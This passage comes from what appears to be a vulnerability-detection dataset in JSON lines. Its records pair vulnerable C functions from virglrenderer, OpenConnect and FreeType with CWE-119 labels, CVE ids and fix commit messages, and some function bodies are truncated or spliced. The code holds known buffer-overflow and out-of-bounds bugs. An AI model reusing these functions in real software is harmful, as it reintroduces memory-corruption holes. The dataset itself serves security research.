)\n{\n   uint file;\n   uint swizzle[3];\n   boolean parsed_swizzle;\n   struct parsed_bracket bracket;\n\n   if (!parse_register_src(ctx, &file, &bracket))\n      return FALSE;\n\n   src->File = file;\n   src->Index = bracket.index;\n\n   /* Parse optional swizzle.\n    */\n   if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 3 )) {\n      if (parsed_swizzle) {\n         src->SwizzleX = swizzle[0];\n         src->SwizzleY = swizzle[1];\n         src->SwizzleZ = swizzle[2];\n      }\n   }\n\n   return TRUE;\n}\n\nstatic boolean\nmatch_inst(const char **pcur,\n           unsigned *saturate,\n           const struct tgsi_opcode_info *info)\n{\n   const char *cur = *pcur;\n\n   /* simple case: the whole string matches the instruction name */\n   if (str_match_nocase_whole(&cur, info->mnemonic)) {\n      *pcur = cur;\n      *saturate = 0;\n      return TRUE;\n   }\n\n   if (str_match_no_case(&cur, info->mnemonic)) {\n      /* the instruction has a suffix, figure it out */\n      if (str_match_nocase_whole(&cur, \"_SAT\")) {\n         *pcur = cur;\n         *saturate = 1;\n         return TRUE;\n      }\n   }\n\n   return FALSE;\n}\n\nstatic boolean\nparse_instruction(\n   struct translate_ctx *ctx,\n   boolean has_label )\n{\n   uint i;\n   uint saturate = 0;\n   const struct tgsi_opcode_info *info;\n   struct tgsi_full_instruction inst;\n   const char *cur;\n   uint advance;\n\n   inst = tgsi_default_full_instruction();\n\n   /* Parse predicate.\n    */\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur == '(') {\n      uint file;\n      int index;\n      uint swizzle[4];\n      boolean parsed_swizzle;\n\n      inst.Instruction.Predicate = 1;\n\n      ctx->cur++;\n      if (*ctx->cur == '!') {\n         ctx->cur++;\n         inst.Predicate.Negate = 1;\n      }\n\n      if (!parse_register_1d( ctx, &file, &index ))\n         return FALSE;\n\n      if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 4 )) {\n         if (parsed_swizzle) {\n            inst.Predicate.SwizzleX = swizzle[0];\n            inst.Predicate.SwizzleY = swizzle[1];\n            inst.Predicate.SwizzleZ = swizzle[2];\n            inst.Predicate.SwizzleW = swizzle[3];\n         }\n      }\n\n      if (*ctx->cur != ')') {\n         report_error( ctx, \"Expected `)'\" );\n         return FALSE;\n      }\n\n      ctx->cur++;\n   }\n\n   /* Parse instruction name.\n    */\n   eat_opt_white( &ctx->cur );\n   for (i = 0; i < TGSI_OPCODE_LAST; i++) {\n      cur = ctx->cur;\n\n      info = tgsi_get_opcode_info( i );\n      if (match_inst(&cur, &saturate, info)) {\n         if (info->num_dst + info->num_src + info->is_tex == 0) {\n            ctx->cur = cur;\n            break;\n         }\n         else if (*cur == '\\0' || eat_white( &cur )) {\n            ctx->cur = cur;\n            break;\n         }\n      }\n   }\n   if (i == TGSI_OPCODE_LAST) {\n      if (has_label)\n         report_error( ctx, \"Unknown opcode\" );\n      else\n         report_error( ctx, \"Expected `DCL', `IMM' or a label\" );\n      return FALSE;\n   }\n\n   inst.Instruction.Opcode = i;\n   inst.Instruction.Saturate = saturate;\n   inst.Instruction.NumDstRegs = info->num_dst;\n   inst.Instruction.NumSrcRegs = info->num_src;\n\n   if (i >= TGSI_OPCODE_SAMPLE && i <= TGSI_OPCODE_GATHER4) {\n      /*\n       * These are not considered tex opcodes here (no additional\n       * target argument) however we're required to set the Texture\n       * bit so we can set the number of tex offsets.\n       */\n      inst.Instruction.Texture = 1;\n      inst.Texture.Texture = TGSI_TEXTURE_UNKNOWN;\n   }\n\n   /* Parse instruction operands.\n    */\n   for (i = 0; i < info->num_dst + info->num_src + info->is_tex; i++) {\n      if (i > 0) {\n         eat_opt_white( &ctx->cur );\n         if (*ctx->cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white( &ctx->cur );\n      }\n\n      if (i < info->num_dst) {\n         if (!parse_dst_operand( ctx, &inst.Dst[i] ))\n            return FALSE;\n      }\n      else if (i < info->num_dst + info->num_src) {\n         if (!parse_src_operand( ctx, &inst.Src[i - info->num_dst] ))\n            return FALSE;\n      }\n      else {\n         uint j;\n\n         for (j = 0; j < TGSI_TEXTURE_COUNT; j++) {\n            if (str_match_nocase_whole( &ctx->cur, tgsi_texture_names[j] )) {\n               inst.Instruction.Texture = 1;\n               inst.Texture.Texture = j;\n               break;\n            }\n         }\n         if (j == TGSI_TEXTURE_COUNT) {\n            report_error( ctx, \"Expected texture target\" );\n            return FALSE;\n         }\n      }\n   }\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   for (i = 0; inst.Instruction.Texture && *cur == ','; i++) {\n         cur++;\n         eat_opt_white( &cur );\n         ctx->cur = cur;\n         if (!parse_texoffset_operand( ctx, &inst.TexOffsets[i] ))\n            return FALSE;\n         cur = ctx->cur;\n         eat_opt_white( &cur );\n   }\n   inst.Texture.NumOffsets = i;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (info->is_branch && *cur == ':') {\n      uint target;\n\n      cur++;\n      eat_opt_white( &cur );\n      if (!parse_uint( &cur, &target )) {\n         report_error( ctx, \"Expected a label\" );\n         return FALSE;\n      }\n      inst.Instruction.Label = 1;\n      inst.Label.Label = target;\n      ctx->cur = cur;\n   }\n\n   advance = tgsi_build_full_instruction(\n      &inst,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   return TRUE;\n}\n\n/* parses a 4-touple of the form {x, y, z, w}\n * where x, y, z, w are numbers */\nstatic boolean parse_immediate_data(struct translate_ctx *ctx, unsigned type,\n                                    union tgsi_immediate_data *values)\n{\n   unsigned i;\n   int ret;\n\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != '{') {\n      report_error( ctx, \"Expected `{'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   for (i = 0; i < 4; i++) {\n      eat_opt_white( &ctx->cur );\n      if (i > 0) {\n         if (*ctx->cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white( &ctx->cur );\n      }\n\n      switch (type) {\n      case TGSI_IMM_FLOAT64:\n         ret = parse_double(&ctx->cur, &values[i].Uint, &values[i+1].Uint);\n         i++;\n         break;\n      case TGSI_IMM_FLOAT32:\n         ret = parse_float(&ctx->cur, &values[i].Float);\n         break;\n      case TGSI_IMM_UINT32:\n         ret = parse_uint(&ctx->cur, &values[i].Uint);\n         break;\n      case TGSI_IMM_INT32:\n         ret = parse_int(&ctx->cur, &values[i].Int);\n         break;\n      default:\n         assert(0);\n         ret = FALSE;\n         break;\n      }\n\n      if (!ret) {\n         report_error( ctx, \"Expected immediate constant\" );\n         return FALSE;\n      }\n   }\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != '}') {\n      report_error( ctx, \"Expected `}'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n\n   return TRUE;\n}\n\nstatic boolean parse_declaration( struct translate_ctx *ctx )\n{\n   struct tgsi_full_declaration decl;\n   uint file;\n   struct parsed_dcl_bracket brackets[2];\n   int num_brackets;\n   uint writemask;\n   const char *cur, *cur2;\n   uint advance;\n   boolean is_vs_input;\n\n   if (!eat_white( &ctx->cur )) {\n      report_error( ctx, \"Syntax error\" );\n      return FALSE;\n   }\n   if (!parse_register_dcl( ctx, &file, brackets, &num_brackets))\n      return FALSE;\n   if (!parse_opt_writemask( ctx, &writemask ))\n      return FALSE;\n\n   decl = tgsi_default_full_declaration();\n   decl.Declaration.File = file;\n   decl.Declaration.UsageMask = writemask;\n\n   if (num_brackets == 1) {\n      decl.Range.First = brackets[0].first;\n      decl.Range.Last = brackets[0].last;\n   } else {\n      decl.Range.First = brackets[1].first;\n      decl.Range.Last = brackets[1].last;\n\n      decl.Declaration.Dimension = 1;\n      decl.Dim.Index2D = brackets[0].first;\n   }\n\n   is_vs_input = (file == TGSI_FILE_INPUT &&\n                  ctx->processor == TGSI_PROCESSOR_VERTEX);\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == ',') {\n      cur2 = cur;\n      cur2++;\n      eat_opt_white( &cur2 );\n      if (str_match_nocase_whole( &cur2, \"ARRAY\" )) {\n         int arrayid;\n         if (*cur2 != '(') {\n            report_error( ctx, \"Expected `('\" );\n            return FALSE;\n         }\n         cur2++;\n         eat_opt_white( &cur2 );\n         if (!parse_int( &cur2, &arrayid )) {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         eat_opt_white( &cur2 );\n         if (*cur2 != ')') {\n            report_error( ctx, \"Expected `)'\" );\n            return FALSE;\n         }\n         cur2++;\n         decl.Declaration.Array = 1;\n         decl.Array.ArrayID = arrayid;\n         ctx->cur = cur = cur2;\n      }\n   }\n\n   if (*cur == ',' && !is_vs_input) {\n      uint i, j;\n\n      cur++;\n      eat_opt_white( &cur );\n      if (file == TGSI_FILE_RESOURCE) {\n         for (i = 0; i < TGSI_TEXTURE_COUNT; i++) {\n            if (str_match_nocase_whole(&cur, tgsi_texture_names[i])) {\n               decl.Resource.Resource = i;\n               break;\n            }\n         }\n         if (i == TGSI_TEXTURE_COUNT) {\n            report_error(ctx, \"Expected texture target\");\n            return FALSE;\n         }\n\n         cur2 = cur;\n         eat_opt_white(&cur2);\n         while (*cur2 == ',') {\n            cur2++;\n            eat_opt_white(&cur2);\n            if (str_match_nocase_whole(&cur2, \"RAW\")) {\n               decl.Resource.Raw = 1;\n\n            } else if (str_match_nocase_whole(&cur2, \"WR\")) {\n               decl.Resource.Writable = 1;\n\n            } else {\n               break;\n            }\n            cur = cur2;\n            eat_opt_white(&cur2);\n         }\n\n         ctx->cur = cur;\n\n      } else if (file == TGSI_FILE_SAMPLER_VIEW) {\n         for (i = 0; i < TGSI_TEXTURE_COUNT; i++) {\n            if (str_match_nocase_whole(&cur, tgsi_texture_names[i])) {\n               decl.SamplerView.Resource = i;\n               break;\n            }\n         }\n         if (i == TGSI_TEXTURE_COUNT) {\n            report_error(ctx, \"Expected texture target\");\n            return FALSE;\n         }\n         eat_opt_white( &cur );\n         if (*cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ++cur;\n         eat_opt_white( &cur );\n         for (j = 0; j < 4; ++j) {\n            for (i = 0; i < TGSI_RETURN_TYPE_COUNT; ++i) {\n               if (str_match_nocase_whole(&cur, tgsi_return_type_names[i])) {\n                  switch (j) {\n                  case 0:\n                     decl.SamplerView.ReturnTypeX = i;\n                     break;\n                  case 1:\n                     decl.SamplerView.ReturnTypeY = i;\n                     break;\n                  case 2:\n                     decl.SamplerView.ReturnTypeZ = i;\n                     break;\n                  case 3:\n                     decl.SamplerView.ReturnTypeW = i;\n                     break;\n                  default:\n                     assert(0);\n                  }\n                  break;\n               }\n            }\n            if (i == TGSI_RETURN_TYPE_COUNT) {\n               if (j == 0 || j >  2) {\n                  report_error(ctx, \"Expected type name\");\n                  return FALSE;\n               }\n               break;\n            } else {\n               cur2 = cur;\n               eat_opt_white( &cur2 );\n               if (*cur2 == ',') {\n                  cur2++;\n                  eat_opt_white( &cur2 );\n                  cur = cur2;\n                  continue;\n               } else\n                  break;\n            }\n         }\n         if (j < 4) {\n            decl.SamplerView.ReturnTypeY =\n               decl.SamplerView.ReturnTypeZ =\n               decl.SamplerView.ReturnTypeW =\n               decl.SamplerView.ReturnTypeX;\n         }\n         ctx->cur = cur;\n      } else {\n         if (str_match_nocase_whole(&cur, \"LOCAL\")) {\n            decl.Declaration.Local = 1;\n            ctx->cur = cur;\n         }\n\n         cur = ctx->cur;\n         eat_opt_white( &cur );\n         if (*cur == ',') {\n            cur++;\n            eat_opt_white( &cur );\n\n            for (i = 0; i < TGSI_SEMANTIC_COUNT; i++) {\n               if (str_match_nocase_whole(&cur, tgsi_semantic_names[i])) {\n                  uint index;\n\n                  cur2 = cur;\n                  eat_opt_white( &cur2 );\n                  if (*cur2 == '[') {\n                     cur2++;\n                     eat_opt_white( &cur2 );\n                     if (!parse_uint( &cur2, &index )) {\n                        report_error( ctx, \"Expected literal integer\" );\n                        return FALSE;\n                     }\n                     eat_opt_white( &cur2 );\n                     if (*cur2 != ']') {\n                        report_error( ctx, \"Expected `]'\" );\n                        return FALSE;\n                     }\n                     cur2++;\n\n                     decl.Semantic.Index = index;\n\n                     cur = cur2;\n                  }\n\n                  decl.Declaration.Semantic = 1;\n                  decl.Semantic.Name = i;\n\n                  ctx->cur = cur;\n                  break;\n               }\n            }\n         }\n      }\n   }\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == ',' && !is_vs_input) {\n      uint i;\n\n      cur++;\n      eat_opt_white( &cur );\n      for (i = 0; i < TGSI_INTERPOLATE_COUNT; i++) {\n         if (str_match_nocase_whole( &cur, tgsi_interpolate_names[i] )) {\n            decl.Declaration.Interpolate = 1;\n            decl.Interp.Interpolate = i;\n\n            ctx->cur = cur;\n            break;\n         }\n      }\n      if (i == TGSI_INTERPOLATE_COUNT) {\n         report_error( ctx, \"Expected semantic or interpolate attribute\" );\n         return FALSE;\n      }\n   }\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == ',' && !is_vs_input) {\n      uint i;\n\n      cur++;\n      eat_opt_white( &cur );\n      for (i = 0; i < TGSI_INTERPOLATE_LOC_COUNT; i++) {\n         if (str_match_nocase_whole( &cur, tgsi_interpolate_locations[i] )) {\n            decl.Interp.Location = i;\n\n            ctx->cur = cur;\n            break;\n         }\n      }\n   }\n\n   advance = tgsi_build_full_declaration(\n      &decl,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   return TRUE;\n}\n\nstatic boolean parse_immediate( struct translate_ctx *ctx )\n{\n   struct tgsi_full_immediate imm;\n   uint advance;\n   int type;\n\n   if (*ctx->cur == '[') {\n      uint uindex;\n\n      ++ctx->cur;\n\n      eat_opt_white( &ctx->cur );\n      if (!parse_uint( &ctx->cur, &uindex )) {\n         report_error( ctx, \"Expected literal unsigned integer\" );\n         return FALSE;\n      }\n\n      if (uindex != ctx->num_immediates) {\n         report_error( ctx, \"Immediates must be sorted\" );\n         return FALSE;\n      }\n\n      eat_opt_white( &ctx->cur );\n      if (*ctx->cur != ']') {\n         report_error( ctx, \"Expected `]'\" );\n         return FALSE;\n      }\n\n      ctx->cur++;\n   }\n\n   if (!eat_white( &ctx->cur )) {\n      report_error( ctx, \"Syntax error\" );\n      return FALSE;\n   }\n   for (type = 0; type < Elements(tgsi_immediate_type_names); ++type) {\n      if (str_match_nocase_whole(&ctx->cur, tgsi_immediate_type_names[type]))\n         break;\n   }\n   if (type == Elements(tgsi_immediate_type_names)) {\n      report_error( ctx, \"Expected immediate type\" );\n      return FALSE;\n   }\n\n   imm = tgsi_default_full_immediate();\n   imm.Immediate.NrTokens += 4;\n   imm.Immediate.DataType = type;\n   parse_immediate_data(ctx, type, imm.u);\n\n   advance = tgsi_build_full_immediate(\n      &imm,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   ctx->num_immediates++;\n\n   return TRUE;\n}\n\nstatic boolean\nparse_primitive( const char **pcur, uint *primitive )\n{\n   uint i;\n\n   for (i = 0; i < PIPE_PRIM_MAX; i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_primitive_names[i])) {\n         *primitive = i;\n         *pcur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_fs_coord_origin( const char **pcur, uint *fs_coord_origin )\n{\n   uint i;\n\n   for (i = 0; i < Elements(tgsi_fs_coord_origin_names); i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_fs_coord_origin_names[i])) {\n         *fs_coord_origin = i;\n         *pcur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_fs_coord_pixel_center( const char **pcur, uint *fs_coord_pixel_center )\n{\n   uint i;\n\n   for (i = 0; i < Elements(tgsi_fs_coord_pixel_center_names); i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_fs_coord_pixel_center_names[i])) {\n         *fs_coord_pixel_center = i;\n         *pcur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\n\nstatic boolean parse_property( struct translate_ctx *ctx )\n{\n   struct tgsi_full_property prop;\n   uint property_name;\n   uint values[8];\n   uint advance;\n   char id[64];\n\n   if (!eat_white( &ctx->cur )) {\n      report_error( ctx, \"Syntax error\" );\n      return FALSE;\n   }\n       report_error( ctx, \"Syntax error\" );\n       return FALSE;\n    }\n   if (!parse_identifier( &ctx->cur, id )) {\n       report_error( ctx, \"Syntax error\" );\n       return FALSE;\n    }\n         break;\n      }\n   }\n", "func_hash": 142817990104108566810102542927701673732, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-6209", "cve_desc": "Stack-based buffer overflow in the parse_identifier function in tgsi_text.c in the TGSI auxiliary module in the Gallium driver in virglrenderer before 0.6.0 allows local guest OS users to cause a denial of service (out-of-bounds array access and QEMU process crash) via vectors related to parsing properties.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-6209"}
{"idx": 242, "project": "virglrenderer", "commit_id": "114688c526fe45f341d75ccd1d85473c3b08f7a7", "project_url": "https://gitlab.freedesktop.org/virgl/virglrenderer", "commit_url": "https://cgit.freedesktop.org/virglrenderer/commit/?id=114688c526fe45f341d75ccd1d85473c3b08f7a7", "commit_message": "renderer: fix heap overflow in vertex elements state create\n\nThe 'num_elements' can be controlled by the guest but the\n'vrend_vertex_element_array' has a fixed 'elements' field.\nThis can cause a heap overflow. Add sanity check of 'num_elements'.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nReviewed-by: Marc-Andr\u00e9 Lureau <marcandre.lureau@redhat.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 1, "func": "int vrend_create_vertex_elements_state(struct vrend_context *ctx,\n                                       uint32_t handle,\n                                       unsigned num_elements,\n                                       const struct pipe_vertex_element *elements)\n{\n   struct vrend_vertex_element_array *v = CALLOC_STRUCT(vrend_vertex_element_array);\n   const struct util_format_description *desc;\n   GLenum type;\n   int i;\n   uint32_t ret_handle;\n\n    if (!v)\n       return ENOMEM;\n \n    v->count = num_elements;\n    for (i = 0; i < num_elements; i++) {\n       memcpy(&v->elements[i].base, &elements[i], sizeof(struct pipe_vertex_element));\n         FREE(v);\n         return EINVAL;\n      }\n\n      type = GL_FALSE;\n      if (desc->channel[0].type == UTIL_FORMAT_TYPE_FLOAT) {\n         if (desc->channel[0].size == 32)\n            type = GL_FLOAT;\n         else if (desc->channel[0].size == 64)\n            type = GL_DOUBLE;\n         else if (desc->channel[0].size == 16)\n            type = GL_HALF_FLOAT;\n      } else if (desc->channel[0].type == UTIL_FORMAT_TYPE_UNSIGNED &&\n                 desc->channel[0].size == 8)\n         type = GL_UNSIGNED_BYTE;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_SIGNED &&\n               desc->channel[0].size == 8)\n         type = GL_BYTE;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_UNSIGNED &&\n               desc->channel[0].size == 16)\n         type = GL_UNSIGNED_SHORT;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_SIGNED &&\n               desc->channel[0].size == 16)\n         type = GL_SHORT;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_UNSIGNED &&\n               desc->channel[0].size == 32)\n         type = GL_UNSIGNED_INT;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_SIGNED &&\n               desc->channel[0].size == 32)\n         type = GL_INT;\n      else if (elements[i].src_format == PIPE_FORMAT_R10G10B10A2_SSCALED ||\n               elements[i].src_format == PIPE_FORMAT_R10G10B10A2_SNORM ||\n               elements[i].src_format == PIPE_FORMAT_B10G10R10A2_SNORM)\n         type = GL_INT_2_10_10_10_REV;\n      else if (elements[i].src_format == PIPE_FORMAT_R10G10B10A2_USCALED ||\n               elements[i].src_format == PIPE_FORMAT_R10G10B10A2_UNORM ||\n               elements[i].src_format == PIPE_FORMAT_B10G10R10A2_UNORM)\n         type = GL_UNSIGNED_INT_2_10_10_10_REV;\n      else if (elements[i].src_format == PIPE_FORMAT_R11G11B10_FLOAT)\n         type = GL_UNSIGNED_INT_10F_11F_11F_REV;\n\n      if (type == GL_FALSE) {\n         report_context_error(ctx, VIRGL_ERROR_CTX_ILLEGAL_VERTEX_FORMAT, elements[i].src_format);\n         FREE(v);\n         return EINVAL;\n      }\n\n      v->elements[i].type = type;\n      if (desc->channel[0].normalized)\n         v->elements[i].norm = GL_TRUE;\n      if (desc->nr_channels == 4 && desc->swizzle[0] == UTIL_FORMAT_SWIZZLE_Z)\n         v->elements[i].nr_chan = GL_BGRA;\n      else if (elements[i].src_format == PIPE_FORMAT_R11G11B10_FLOAT)\n         v->elements[i].nr_chan = 3;\n      else\n         v->elements[i].nr_chan = desc->nr_channels;\n   }\n", "func_hash": 127813115019639337707795536823961346235, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-5994", "cve_desc": "Heap-based buffer overflow in the vrend_create_vertex_elements_state function in vrend_renderer.c in virglrenderer before 0.6.0 allows local guest OS users to cause a denial of service (out-of-bounds array access and crash) via the num_elements parameter.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5994"}
{"idx": 246, "project": "infradead", "commit_id": "14cae65318d3ef1f7d449e463b72b6934e82f1c2", "project_url": "http://git.infradead.org/?p=mtd-2.6", "commit_url": "http://git.infradead.org/users/dwmw2/openconnect.git/commitdiff/14cae65318d3ef1f7d449e463b72b6934e82f1c2", "commit_message": "None", "target": 1, "func": "static void set_banner(struct openconnect_info *vpninfo)\n{\n        char *banner, *q;\n        const char *p;\n \n       if (!vpninfo->banner || !(banner = malloc(strlen(vpninfo->banner)))) {\n                unsetenv(\"CISCO_BANNER\");\n                return;\n        }\n\tp = vpninfo->banner;\n\tq = banner;\n\t\n\twhile (*p) {\n\t\tif (*p == '%' && isxdigit((int)(unsigned char)p[1]) &&\n\t\t    isxdigit((int)(unsigned char)p[2])) {\n\t\t\t*(q++) = unhex(p + 1);\n\t\t\tp += 3;\n\t\t} else \n\t\t\t*(q++) = *(p++);\n\t}\n\t*q = 0;\n\tsetenv(\"CISCO_BANNER\", banner, 1);\n\n\tfree(banner);\n}\t\n", "func_hash": 174272131383202600271920404270020112167, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2012-3291", "cve_desc": "Heap-based buffer overflow in OpenConnect 3.18 allows remote servers to cause a denial of service via a crafted greeting banner.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-3291"}
{"idx": 254, "project": "virglrenderer", "commit_id": "28894a30a17a84529be102b21118e55d6c9f23fa", "project_url": "https://gitlab.freedesktop.org/virgl/virglrenderer", "commit_url": "https://cgit.freedesktop.org/virglrenderer/commit/src/gallium/auxiliary/tgsi/tgsi_text.c?id=28894a30a17a84529be102b21118e55d6c9f23fa", "commit_message": "gallium/tgsi: fix oob access in parse instruction\n\nWhen parsing texture instruction, it doesn't stop if the\n'cur' is ',', the loop variable 'i' will also be increased\nand be used to index the 'inst.TexOffsets' array. This can lead\nan oob access issue. This patch avoid this.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 1, "func": "parse_instruction(\n   struct translate_ctx *ctx,\n   boolean has_label )\n{\n   uint i;\n   uint saturate = 0;\n   const struct tgsi_opcode_info *info;\n   struct tgsi_full_instruction inst;\n   const char *cur;\n   uint advance;\n\n   inst = tgsi_default_full_instruction();\n\n   /* Parse predicate.\n    */\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur == '(') {\n      uint file;\n      int index;\n      uint swizzle[4];\n      boolean parsed_swizzle;\n\n      inst.Instruction.Predicate = 1;\n\n      ctx->cur++;\n      if (*ctx->cur == '!') {\n         ctx->cur++;\n         inst.Predicate.Negate = 1;\n      }\n\n      if (!parse_register_1d( ctx, &file, &index ))\n         return FALSE;\n\n      if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 4 )) {\n         if (parsed_swizzle) {\n            inst.Predicate.SwizzleX = swizzle[0];\n            inst.Predicate.SwizzleY = swizzle[1];\n            inst.Predicate.SwizzleZ = swizzle[2];\n            inst.Predicate.SwizzleW = swizzle[3];\n         }\n      }\n\n      if (*ctx->cur != ')') {\n         report_error( ctx, \"Expected `)'\" );\n         return FALSE;\n      }\n\n      ctx->cur++;\n   }\n\n   /* Parse instruction name.\n    */\n   eat_opt_white( &ctx->cur );\n   for (i = 0; i < TGSI_OPCODE_LAST; i++) {\n      cur = ctx->cur;\n\n      info = tgsi_get_opcode_info( i );\n      if (match_inst(&cur, &saturate, info)) {\n         if (info->num_dst + info->num_src + info->is_tex == 0) {\n            ctx->cur = cur;\n            break;\n         }\n         else if (*cur == '\\0' || eat_white( &cur )) {\n            ctx->cur = cur;\n            break;\n         }\n      }\n   }\n   if (i == TGSI_OPCODE_LAST) {\n      if (has_label)\n         report_error( ctx, \"Unknown opcode\" );\n      else\n         report_error( ctx, \"Expected `DCL', `IMM' or a label\" );\n      return FALSE;\n   }\n\n   inst.Instruction.Opcode = i;\n   inst.Instruction.Saturate = saturate;\n   inst.Instruction.NumDstRegs = info->num_dst;\n   inst.Instruction.NumSrcRegs = info->num_src;\n\n   if (i >= TGSI_OPCODE_SAMPLE && i <= TGSI_OPCODE_GATHER4) {\n      /*\n       * These are not considered tex opcodes here (no additional\n       * target argument) however we're required to set the Texture\n       * bit so we can set the number of tex offsets.\n       */\n      inst.Instruction.Texture = 1;\n      inst.Texture.Texture = TGSI_TEXTURE_UNKNOWN;\n   }\n\n   /* Parse instruction operands.\n    */\n   for (i = 0; i < info->num_dst + info->num_src + info->is_tex; i++) {\n      if (i > 0) {\n         eat_opt_white( &ctx->cur );\n         if (*ctx->cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white( &ctx->cur );\n      }\n\n      if (i < info->num_dst) {\n         if (!parse_dst_operand( ctx, &inst.Dst[i] ))\n            return FALSE;\n      }\n      else if (i < info->num_dst + info->num_src) {\n         if (!parse_src_operand( ctx, &inst.Src[i - info->num_dst] ))\n            return FALSE;\n      }\n      else {\n         uint j;\n\n         for (j = 0; j < TGSI_TEXTURE_COUNT; j++) {\n            if (str_match_nocase_whole( &ctx->cur, tgsi_texture_names[j] )) {\n               inst.Instruction.Texture = 1;\n               inst.Texture.Texture = j;\n               break;\n            }\n         }\n         if (j == TGSI_TEXTURE_COUNT) {\n            report_error( ctx, \"Expected texture target\" );\n            return FALSE;\n         }\n      }\n   }\n \n    cur = ctx->cur;\n    eat_opt_white( &cur );\n   for (i = 0; inst.Instruction.Texture && *cur == ','; i++) {\n          cur++;\n          eat_opt_white( &cur );\n          ctx->cur = cur;\n         if (!parse_texoffset_operand( ctx, &inst.TexOffsets[i] ))\n            return FALSE;\n         cur = ctx->cur;\n         eat_opt_white( &cur );\n   }\n   inst.Texture.NumOffsets = i;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (info->is_branch && *cur == ':') {\n      uint target;\n\n      cur++;\n      eat_opt_white( &cur );\n      if (!parse_uint( &cur, &target )) {\n         report_error( ctx, \"Expected a label\" );\n         return FALSE;\n      }\n      inst.Instruction.Label = 1;\n      inst.Label.Label = target;\n      ctx->cur = cur;\n   }\n\n   advance = tgsi_build_full_instruction(\n      &inst,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   return TRUE;\n}\n", "func_hash": 207706300612945852467345419819110560855, "file_name": "tgsi_text.c", "file_hash": 168133196584781827023897723824575291202, "cwe": ["CWE-119"], "cve": "CVE-2017-5580", "cve_desc": "The parse_instruction function in gallium/auxiliary/tgsi/tgsi_text.c in virglrenderer before 0.6.0 allows local guest OS users to cause a denial of service (out-of-bounds array access and process crash) via a crafted texture instruction.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5580"}
{"idx": 263, "project": "savannah", "commit_id": "888cd1843e935fe675cf2ac303116d4ed5b9d54b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=888cd1843e935fe675cf2ac303116d4ed5b9d54b", "commit_message": "None", "target": 1, "func": "  Ins_IUP( INS_ARG )\n  {\n    IUP_WorkerRec  V;\n    FT_Byte        mask;\n\n    FT_UInt   first_point;   /* first point of contour        */\n    FT_UInt   end_point;     /* end point (last+1) of contour */\n\n    FT_UInt   first_touched; /* first touched point in contour   */\n    FT_UInt   cur_touched;   /* current touched point in contour */\n\n    FT_UInt   point;         /* current point   */\n    FT_Short  contour;       /* current contour */\n\n    FT_UNUSED_ARG;\n\n\n    /* ignore empty outlines */\n    if ( CUR.pts.n_contours == 0 )\n      return;\n\n    if ( CUR.opcode & 1 )\n    {\n      mask   = FT_CURVE_TAG_TOUCH_X;\n      V.orgs = CUR.pts.org;\n      V.curs = CUR.pts.cur;\n      V.orus = CUR.pts.orus;\n    }\n    else\n    {\n      mask   = FT_CURVE_TAG_TOUCH_Y;\n      V.orgs = 